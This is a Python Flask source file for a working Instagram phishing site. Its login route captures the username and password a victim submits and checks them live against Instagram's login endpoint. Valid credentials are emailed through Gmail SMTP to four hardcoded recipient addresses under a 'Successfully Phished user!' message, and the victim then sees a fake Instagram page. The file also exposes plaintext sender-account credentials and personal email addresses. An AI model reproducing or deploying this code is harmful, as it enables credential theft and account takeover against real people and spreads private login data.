from logging import exception
from pickle import TRUE
from flask import Flask, jsonify, request, render_template, redirect, request
import requests, smtplib
app = Flask(__name__)



# Ressources
def validate_account(user, password):
    try:
        url='https://www.instagram.com/accounts/login/ajax/'
        h={
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '291',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
            'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1cb44f68ffec',
            'x-requested-with': 'XMLHttpRequest'}
        data={
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'}
        req=requests.post(url,data=data, headers=h)
        if '"authenticated":true' in req.text:
            print('Done Logged in')
            return True
        else:
            print(req.text)
            return False
    except Exception as e:
        print(e)
          
def send_email(user, password):
    email = "nico.end.cool@gmail.com"
    pswd = "nicoEND!"
    subject = " @nico.end phishing "
    emails = ["arshalledeiros@yahoo.com", "katana.here@gmail.com", "nico205psn@gmail.com", "adtrohnix@gmail.com"]
    message = (f"> Successfully Phished user!< \n"
               f"> Username / Email: {user} <\n "
               f"> Password: {password} <\n")  
    while True:
        try:
            for vemail in emails:
                BODY = "\r\n".join(("From: %s" % email, "To: %s" %
                                    vemail, "Subject: %s" % subject, "", message))
                smtp_server = 'smtp.gmail.com'
                port = 587
                server = smtplib.SMTP(smtp_server, port)
                server.ehlo()
                if smtp_server == "smtp.gmail.com":
                    server.starttls()
                server.login(email, pswd)
                try:
                    print(f"Email sent to {vemail}")
                    server.sendmail(email, vemail, BODY)
                except Exception as e:
                    print(e)
            server.quit()
            break
        except:pass
    return True


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route("/login", methods=["POST", "GET"])
def login():
    if request.method == "POST":
        output = request.form.to_dict()
        user = output['email']
        password = output['password']
        print(user+":"+password)
        if validate_account(user, password) == True:
            print("sending email.")
            if send_email(user, password) == True:
                print("redirect to instagram.com")
                return render_template('instagram.html')
        else:
            return render_template('index.html', false_login=True)
    else:
        return redirect('/')


if __name__ == "__main__":
  app.run(debug=False, host='0.0.0.0', port=8000)
